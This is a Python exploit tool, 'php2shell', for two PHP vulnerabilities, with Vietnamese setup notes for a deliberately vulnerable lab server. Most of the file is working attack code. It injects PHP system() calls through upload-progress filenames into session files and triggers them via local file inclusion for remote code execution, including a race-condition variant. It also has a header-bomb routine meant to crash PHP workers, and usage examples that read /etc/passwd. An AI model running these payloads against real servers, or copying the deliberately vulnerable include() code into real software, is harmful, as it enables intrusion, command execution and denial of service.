#!/usr/bin/env python3
"""
php2shell — CVE-2026-109618 / CVE-2026-109619
All-in-one Scanner + Exploit Verifier

Cach dung:
=========

BUOC 1: Setup server PHP tren cloud (VPS Ubuntu/Debian)
---------------------------------------------------------
SSH vao VPS roi chay:

    # Cai PHP-FPM + nginx
    apt update && apt install -y nginx php-fpm php-cli

    # Tao webroot
    mkdir -p /var/www/php2shell

    # Tao cac file PHP can thiet
    cat > /var/www/php2shell/index.php << 'PHPEOF'
    <?php session_start(); echo "OK " . phpversion(); ?>
    PHPEOF

    cat > /var/www/php2shell/vuln.php << 'PHPEOF'
    <?php
    session_start();
    if (isset($_GET['page'])) { include($_GET['page']); }
    echo "vuln endpoint";
    ?>
    PHPEOF

    cat > /var/www/php2shell/info.php << 'PHPEOF'
    <?php phpinfo(); ?>
    PHPEOF

    # Cau hinh nginx
    cat > /etc/nginx/sites-available/php2shell << 'NGXEOF'
    server {
        listen 8888;
        root /var/www/php2shell;
        index index.php;
        location ~ \.php$ {
            include snippets/fastcgi-php.conf;
            fastcgi_pass unix:/run/php/php-fpm.sock;
        }
    }
    NGXEOF
    ln -sf /etc/nginx/sites-available/php2shell /etc/nginx/sites-enabled/
    nginx -t && systemctl reload nginx

    # Cau hinh PHP cho vulnerable (KHONG BAT TREN PRODUCTION!)
    PHP_INI=$(php -r "echo php_ini_loaded_file();")
    sed -i 's/session.upload_progress.enabled.*/session.upload_progress.enabled = On/' $PHP_INI
    sed -i 's/session.use_only_cookies.*/session.use_only_cookies = 0/' $PHP_INI
    sed -i 's/display_errors.*/display_errors = On/' $PHP_INI
    sed -i 's|session.save_path.*|session.save_path = /tmp/sessions|' $PHP_INI
    mkdir -p /tmp/sessions && chmod 1777 /tmp/sessions
    systemctl restart php*-fpm

    echo "Server ready at http://YOUR_IP:8888"

BUOC 2: Chay script nay tu may local
--------------------------------------
    python php2shell_verify.py scan http://YOUR_IP:8888
    python php2shell_verify.py exploit http://YOUR_IP:8888 --command "id"
    python php2shell_verify.py all http://YOUR_IP:8888

For authorized security testing only.
Based on: https://github.com/ikow/php2shell-poc by Qi Deng (@ikow)
"""

import argparse
import json
import re
import socket
import ssl
import sys
import time
import uuid
from urllib.parse import urlparse


# ============================================================
#  Network layer
# ============================================================

def connect(host, port, tls=False, timeout=15):
    raw = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(raw, server_hostname=host)
    return raw


def send_raw(host, port, data, tls=False, timeout=15):
    s = connect(host, port, tls=tls, timeout=timeout)
    s.sendall(data)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except (socket.timeout, ConnectionResetError, ssl.SSLError):
            break
    s.close()
    return resp


def parse_target(target):
    u = urlparse(target if "://" in target else f"http://{target}")
    tls = u.scheme == "https"
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if tls else 80)
    path = u.path or "/"
    return host, port, tls, path


def http_get(host, port, path, tls=False, timeout=10, cookies=""):
    hdrs = f"Host: {host}\r\nConnection: close\r\n"
    if cookies:
        hdrs += f"Cookie: {cookies}\r\n"
    req = f"GET {path} HTTP/1.1\r\n{hdrs}\r\n".encode()
    return send_raw(host, port, req, tls=tls, timeout=timeout)


def http_post_multipart(host, port, path, boundary, body_str,
                        tls=False, timeout=10, cookies=""):
    body = body_str.encode("latin-1")
    hdrs = (
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
    )
    if cookies:
        hdrs += f"Cookie: {cookies}\r\n"
    hdrs += "Connection: close\r\n"
    req = f"POST {path} HTTP/1.1\r\n{hdrs}\r\n".encode() + body
    return send_raw(host, port, req, tls=tls, timeout=timeout)


def parse_http(raw):
    if not raw:
        return 0, {}, b""
    if b"\r\n\r\n" in raw:
        head, body = raw.split(b"\r\n\r\n", 1)
    else:
        head, body = raw, b""
    lines = head.split(b"\r\n")
    status_line = lines[0].decode("latin-1", "replace") if lines else ""
    m = re.match(r"HTTP/\d\.\d\s+(\d+)", status_line)
    status = int(m.group(1)) if m else 0
    headers = {}
    for line in lines[1:]:
        d = line.decode("latin-1", "replace")
        if ":" in d:
            k, v = d.split(":", 1)
            headers[k.strip().lower()] = v.strip()
    return status, headers, body


# ============================================================
#  Version detection
# ============================================================

PATCHED = {(8,2): (8,2,35), (8,3): (8,3,36), (8,4): (8,4,27), (8,5): (8,5,12)}

def parse_ver(s):
    m = re.match(r"(\d+)\.(\d+)\.(\d+)", s)
    return tuple(int(x) for x in m.groups()) if m else None

def is_vuln(vt):
    if vt < (5,4,0):
        return False
    p = PATCHED.get(vt[:2])
    return vt < p if p else True


# ============================================================
#  SCAN
# ============================================================

def do_scan(host, port, path, tls, timeout=10):
    print(f"\n{'='*60}")
    print(f"  php2shell Scanner")
    print(f"  Target: {'https' if tls else 'http'}://{host}:{port}{path}")
    print(f"{'='*60}\n")

    results = {"version": None, "sapi": None, "vulnerable": None,
               "upload_progress": False, "session_fixation": False,
               "chains": []}

    # --- Tier 1: Version ---
    print("[Tier 1] Version fingerprint...")
    resp = http_get(host, port, path, tls=tls, timeout=timeout)
    status, headers, body = parse_http(resp)
    if status == 0:
        print("  [-] Connection failed")
        return results

    xpb = headers.get("x-powered-by", "")
    vm = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
    if vm:
        results["version"] = vm.group(1)
        print(f"  [+] PHP {vm.group(1)} (X-Powered-By)")
    else:
        server = headers.get("server", "")
        sm = re.search(r"PHP/(\d+\.\d+\.\d+)", server)
        if sm:
            results["version"] = sm.group(1)
            print(f"  [+] PHP {sm.group(1)} (Server header)")
        elif body:
            bm = re.search(rb"PHP/(\d+\.\d+\.\d+)", body)
            if bm:
                results["version"] = bm.group(1).decode()
                print(f"  [+] PHP {results['version']} (body)")
            else:
                print("  [-] PHP version not exposed in headers")

    server_hdr = headers.get("server", "").lower()
    if "apache" in server_hdr:
        results["sapi"] = "mod_php"
    elif "nginx" in server_hdr:
        results["sapi"] = "fpm"
    print(f"  [*] SAPI: {results['sapi'] or 'unknown'}")

    if results["version"]:
        vt = parse_ver(results["version"])
        if vt:
            results["vulnerable"] = is_vuln(vt)
            if results["vulnerable"]:
                print(f"  [!] VULNERABLE — below patched version")
            else:
                print(f"  [*] PATCHED")

    # --- Tier 2: upload_progress ---
    print("\n[Tier 2] upload_progress reachability...")
    boundary = "SCAN" + uuid.uuid4().hex[:8]
    body_str = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"scancheck\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="test.txt"\r\n\r\n'
        f"X\r\n"
        f"--{boundary}--\r\n"
    )
    resp2 = http_post_multipart(host, port, path, boundary, body_str,
                                tls=tls, timeout=timeout)
    _, h2, _ = parse_http(resp2)
    sc = h2.get("set-cookie", "")
    if "PHPSESSID" in sc:
        results["upload_progress"] = True
        print(f"  [+] upload_progress reachable (session created)")
    else:
        print(f"  [-] No session cookie returned")

    # Session fixation check
    sid_fix = "fixcheck" + uuid.uuid4().hex[:16]
    body_fix = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
        f"{sid_fix}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"x\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="t.txt"\r\n\r\n'
        f"X\r\n"
        f"--{boundary}--\r\n"
    )
    resp_fix = http_post_multipart(host, port, path, boundary, body_fix,
                                   tls=tls, timeout=timeout)
    _, h_fix, _ = parse_http(resp_fix)
    sc_fix = h_fix.get("set-cookie", "")
    if sid_fix in sc_fix:
        results["session_fixation"] = True
        results["upload_progress"] = True
        print(f"  [!] Session fixation via POST body CONFIRMED")
    else:
        print(f"  [-] Session fixation not confirmed")

    # --- Tier 3: Session write ---
    if results["upload_progress"]:
        print("\n[Tier 3] Session write injection...")
        marker = "___PROBE_" + uuid.uuid4().hex[:8] + "___"
        sid_w = "writecheck" + uuid.uuid4().hex[:14]
        body_w = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            f"{sid_w}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f"; filename="{marker}"\r\n\r\n'
            f"Z\r\n"
            f"--{boundary}--\r\n"
        )
        http_post_multipart(host, port, path, boundary, body_w,
                           tls=tls, timeout=timeout,
                           cookies=f"PHPSESSID={sid_w}")
        print(f"  [*] Marker injected via filename: {marker}")
        print(f"  [*] Session file on server: /tmp/sessions/sess_{sid_w}")

    # --- Chain mapping ---
    sapi = results["sapi"]
    if results["vulnerable"] or results["upload_progress"]:
        results["chains"].append("A")
        results["chains"].append("B")
        if sapi == "fpm":
            results["chains"].extend(["C", "E"])
        elif sapi == "mod_php":
            results["chains"].append("D")
        else:
            results["chains"] = ["A", "B", "C", "D", "E"]

    # --- Summary ---
    print(f"\n{'='*60}")
    verdict = "VULNERABLE" if results["vulnerable"] else (
        "LIKELY_VULNERABLE" if results["upload_progress"] and results["vulnerable"] is None
        else "PATCHED" if results["vulnerable"] is False
        else "UNKNOWN"
    )
    print(f"  Verdict: {verdict}")
    if results["version"]:
        print(f"  PHP: {results['version']}")
    if results["chains"]:
        print(f"  Applicable chains: {', '.join(results['chains'])}")
    if results["vulnerable"]:
        vt = parse_ver(results["version"]) if results["version"] else None
        if vt:
            p = PATCHED.get(vt[:2])
            if p:
                print(f"  Fix: upgrade to PHP {'.'.join(map(str, p))}+")
            else:
                print(f"  Fix: PHP {'.'.join(map(str, vt))} is EOL — upgrade to 8.2.35+/8.3.36+/8.4.27+")
    print(f"{'='*60}\n")
    return results


# ============================================================
#  EXPLOIT — Chain A (Session Injection + LFI)
# ============================================================

def do_exploit_chain_a(host, port, tls, command,
                       inject_path="/index.php", lfi_path="/vuln.php",
                       session_path="/tmp/sessions", attempts=3):
    print(f"\n{'='*60}")
    print(f"  Chain A: Session Injection + LFI -> RCE")
    print(f"  Target: {'https' if tls else 'http'}://{host}:{port}")
    print(f"  Command: {command}")
    print(f"{'='*60}\n")

    cmd = command.replace("'", "'\"'\"'")
    php_code = f"<?php echo '___START___'; system('{cmd}'); echo '___END___';?>"

    for attempt in range(1, attempts + 1):
        sid = "exploit" + uuid.uuid4().hex[:20]
        session_file = f"{session_path}/sess_{sid}"
        print(f"[attempt {attempt}] SID={sid}")

        # Step 1: Inject PHP code via filename
        boundary = "AAABBBCCC"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f"; filename="{php_code}"\r\n\r\n'
            f"Z\r\n"
            f"--{boundary}--\r\n"
        )
        resp1 = http_post_multipart(host, port, inject_path, boundary, body,
                                    tls=tls, timeout=15,
                                    cookies=f"PHPSESSID={sid}")
        s1, _, _ = parse_http(resp1)
        print(f"  [1] Inject: HTTP {s1}")

        # Step 2: Trigger LFI
        lfi_url = f"{lfi_path}?page={session_file}"
        resp2 = http_get(host, port, lfi_url, tls=tls, timeout=15,
                         cookies=f"PHPSESSID={sid}")
        _, _, body2 = parse_http(resp2)

        if b"___START___" in body2 and b"___END___" in body2:
            start = body2.index(b"___START___") + len(b"___START___")
            end = body2.index(b"___END___")
            output = body2[start:end].decode("latin1", "replace").strip()
            print(f"\n  [+] RCE CONFIRMED!")
            print(f"  [+] Output: {output}")
            return True

        s2, _, _ = parse_http(resp2)
        print(f"  [2] LFI: HTTP {s2} — no RCE marker in response")
        time.sleep(0.1)

    print(f"\n  [-] RCE not triggered after {attempts} attempts")
    print(f"      Possible issues:")
    print(f"      - LFI path wrong (try --lfi-path /other.php)")
    print(f"      - Session save path wrong (try --session-path /var/lib/php/sessions)")
    print(f"      - session.upload_progress.cleanup = On (try more attempts)")
    return False


# ============================================================
#  EXPLOIT — Chain A stalled (for cleanup=On)
# ============================================================

def do_exploit_chain_a_race(host, port, tls, command,
                            inject_path="/index.php", lfi_path="/vuln.php",
                            session_path="/tmp/sessions", attempts=10):
    print(f"\n{'='*60}")
    print(f"  Chain A (Race): Session Injection + LFI -> RCE")
    print(f"  Mode: Stalled upload (for session.upload_progress.cleanup=On)")
    print(f"  Target: {'https' if tls else 'http'}://{host}:{port}")
    print(f"  Command: {command}")
    print(f"{'='*60}\n")

    cmd = command.replace("'", "'\"'\"'")
    php_code = f"<?php echo '___START___'; system('{cmd}'); echo '___END___';?>"

    for attempt in range(1, attempts + 1):
        sid = "exploit" + uuid.uuid4().hex[:20]
        session_file = f"{session_path}/sess_{sid}"
        print(f"[attempt {attempt}/{attempts}] SID={sid}")

        # Step 1: Send partial upload (stall — keep connection open)
        boundary = "AAABBBCCC"
        prefix = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="f"; filename="{php_code}"\r\n\r\n'
        ).encode("latin-1")
        first_chunk = prefix + b"Z" * 5120
        content_length = len(first_chunk) + 100000

        req = (
            f"POST {inject_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode() + first_chunk

        try:
            stalled_sock = connect(host, port, tls=tls, timeout=15)
            stalled_sock.sendall(req)
            time.sleep(0.05)

            # Step 2: Trigger LFI while upload is stalled
            lfi_url = f"{lfi_path}?page={session_file}"
            resp2 = http_get(host, port, lfi_url, tls=tls, timeout=10,
                             cookies=f"PHPSESSID={sid}")
            _, _, body2 = parse_http(resp2)

            if b"___START___" in body2 and b"___END___" in body2:
                start = body2.index(b"___START___") + len(b"___START___")
                end = body2.index(b"___END___")
                output = body2[start:end].decode("latin1", "replace").strip()
                print(f"\n  [+] RCE CONFIRMED!")
                print(f"  [+] Output: {output}")
                stalled_sock.close()
                return True

            s2, _, _ = parse_http(resp2)
            print(f"  LFI: HTTP {s2}")
        except Exception as e:
            print(f"  Error: {e}")
        finally:
            try:
                stalled_sock.close()
            except:
                pass
        time.sleep(0.05)

    print(f"\n  [-] RCE not triggered after {attempts} attempts")
    return False


# ============================================================
#  Verify session injection (non-exploit)
# ============================================================

def do_verify_injection(host, port, path, tls, timeout=10):
    print(f"\n{'='*60}")
    print(f"  Verify: Session File Injection")
    print(f"  Target: {'https' if tls else 'http'}://{host}:{port}{path}")
    print(f"{'='*60}\n")

    boundary = "VERIFY"

    # Test 1: Normal filename
    sid1 = "verify" + uuid.uuid4().hex[:20] + "a"
    body1 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid1}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="normal.txt"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    )
    http_post_multipart(host, port, path, boundary, body1, tls=tls,
                        timeout=timeout, cookies=f"PHPSESSID={sid1}")
    print(f"[1] Normal filename -> sess_{sid1}")

    # Test 2: PHP code in filename
    php = "<?php system('id');echo 'RCE';?>"
    sid2 = "verify" + uuid.uuid4().hex[:20] + "b"
    body2 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid2}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{php}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    )
    http_post_multipart(host, port, path, boundary, body2, tls=tls,
                        timeout=timeout, cookies=f"PHPSESSID={sid2}")
    print(f"[2] PHP code in filename -> sess_{sid2}")

    # Test 3: Serialized object
    obj = 'x|O:8:\\"stdClass\\":0:{}'
    sid3 = "verify" + uuid.uuid4().hex[:20] + "c"
    body3 = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid3}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{obj}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    )
    http_post_multipart(host, port, path, boundary, body3, tls=tls,
                        timeout=timeout, cookies=f"PHPSESSID={sid3}")
    print(f"[3] Serialized object in filename -> sess_{sid3}")

    print(f"\n[*] Verify on server:")
    print(f"    cat /tmp/sessions/sess_{sid1}")
    print(f"    cat /tmp/sessions/sess_{sid2}")
    print(f"    cat /tmp/sessions/sess_{sid3}")
    print(f"\n[*] If PHP code appears raw in session file = INJECTION CONFIRMED")
    print(f"    Combined with any LFI = Pre-auth RCE")


# ============================================================
#  Verify OOM trigger
# ============================================================

def do_verify_oom(host, port, path, tls, timeout=30):
    print(f"\n{'='*60}")
    print(f"  Verify: OOM Trigger (Chain D)")
    print(f"  Target: {'https' if tls else 'http'}://{host}:{port}{path}")
    print(f"{'='*60}\n")

    boundary = "OOM_" + str(int(time.time()))

    # Strategy: header bomb (5000 headers x 500 bytes)
    print("[*] Sending header bomb (5000 headers x 500 bytes)...")
    part = f"--{boundary}\r\n"
    part += f'Content-Disposition: form-data; name="f"; filename="a"\r\n'
    for i in range(5000):
        part += f"X-Pad-{i}: {'A' * 500}\r\n"
    part += "\r\nZ\r\n"
    part += f"--{boundary}--\r\n"
    body = part.encode()

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    try:
        s = socket.create_connection((host, port), timeout=timeout)
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.sendall(req)
        s.settimeout(15)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
                if not d:
                    break
                resp += d
            except:
                break
        s.close()
    except Exception as e:
        print(f"[+] Connection error: {e}")
        print(f"    Server process likely crashed — OOM CONFIRMED")
        return

    if resp:
        status_line = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")
        print(f"    Response: {status_line}")
        print(f"    Size: {len(resp)} bytes")
        if b"500" in status_line.encode():
            print(f"\n[+] HTTP 500 — OOM likely triggered!")
        elif b"502" in status_line.encode():
            print(f"\n[+] HTTP 502 — Worker crashed (OOM CONFIRMED)")
        else:
            print(f"\n[-] Server responded normally — try increasing headers")
    else:
        print(f"\n[+] No response — server crashed (OOM CONFIRMED)")


# ============================================================
#  CLI
# ============================================================

SESSION_PATHS = [
    "/tmp/sessions",
    "/tmp",
    "/var/lib/php/sessions",
    "/var/lib/php5/sessions",
    "/var/lib/php/session",
]

def main():
    ap = argparse.ArgumentParser(
        description="php2shell — CVE-2026-109618/109619 Scanner + Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  %(prog)s scan http://target.com:8888
  %(prog)s exploit http://target.com:8888 --command "id"
  %(prog)s exploit http://target.com:8888 --command "cat /etc/passwd" --race
  %(prog)s verify http://target.com:8888
  %(prog)s oom http://target.com:8888
  %(prog)s all http://target.com:8888
""")
    ap.add_argument("action", choices=["scan", "exploit", "verify", "oom", "all"],
                    help="scan=detect, exploit=Chain A RCE, verify=session injection, oom=Chain D, all=everything")
    ap.add_argument("target", help="Target URL (http://host:port)")
    ap.add_argument("--command", "-c", default="id",
                    help="Command to execute (default: id)")
    ap.add_argument("--inject-path", default="/index.php",
                    help="Path for session injection (default: /index.php)")
    ap.add_argument("--lfi-path", default="/vuln.php",
                    help="Path with LFI sink (default: /vuln.php)")
    ap.add_argument("--session-path", default=None,
                    help="Session save path (default: auto-detect)")
    ap.add_argument("--attempts", type=int, default=5)
    ap.add_argument("--race", action="store_true",
                    help="Use stalled upload race (for cleanup=On)")
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args()

    host, port, tls, path = parse_target(args.target)

    if args.action in ("scan", "all"):
        do_scan(host, port, path, tls, timeout=args.timeout)

    if args.action in ("verify", "all"):
        do_verify_injection(host, port, path, tls, timeout=args.timeout)

    if args.action in ("oom", "all"):
        do_verify_oom(host, port, path, tls, timeout=args.timeout)

    if args.action in ("exploit", "all"):
        session_paths = [args.session_path] if args.session_path else SESSION_PATHS
        success = False

        for sp in session_paths:
            print(f"\n[*] Trying session path: {sp}")
            if args.race:
                ok = do_exploit_chain_a_race(
                    host, port, tls, args.command,
                    inject_path=args.inject_path,
                    lfi_path=args.lfi_path,
                    session_path=sp,
                    attempts=args.attempts)
            else:
                ok = do_exploit_chain_a(
                    host, port, tls, args.command,
                    inject_path=args.inject_path,
                    lfi_path=args.lfi_path,
                    session_path=sp,
                    attempts=args.attempts)
            if ok:
                success = True
                break

        if not success and not args.session_path:
            print(f"\n[-] All common session paths failed.")
            print(f"    Try: --session-path /path/to/sessions")
            print(f"    Find it: php -r \"echo ini_get('session.save_path');\"")

    print()


if __name__ == "__main__":
    main()
